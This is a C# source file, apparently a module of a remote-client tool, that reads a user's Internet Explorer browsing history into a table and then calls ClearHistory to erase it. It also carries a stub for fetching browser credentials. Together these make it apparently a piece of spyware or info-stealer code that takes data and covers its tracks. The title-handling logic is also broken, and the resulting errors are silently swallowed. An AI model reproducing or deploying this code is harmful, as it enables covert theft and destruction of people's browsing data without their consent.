using RemoteClient.Browsers;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using UrlHistoryLibrary;

namespace RemoteClient
{
    public class InternetExplorer
    {
        public List<Url> URLs { get; set; }
        private string error = null;

        public string getError()
        {
            return error;
        }

        public DataTable fetchCredentials()
        {
            error = "Not Applicable . .";
            return null;
        }

        public DataTable GetHistory()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Title");
            dt.Columns.Add("URL");

            UrlHistoryWrapperClass urlhistory = new UrlHistoryWrapperClass();
            UrlHistoryWrapperClass.STATURLEnumerator enumerator = urlhistory.GetEnumerator();

            while (enumerator.MoveNext())
            {
                try
                {
                    string url = enumerator.Current.URL.Replace('\'', ' ');
                    string title = string.IsNullOrEmpty(enumerator.Current.Title)
                              ? enumerator.Current.Title.Replace('\'', ' ') : "";

                    dt.Rows.Add(new string[] { title, url });
                }
                catch
                {

                }
            }

            enumerator.Reset();
            urlhistory.ClearHistory();

            return dt;
        }

    }

}
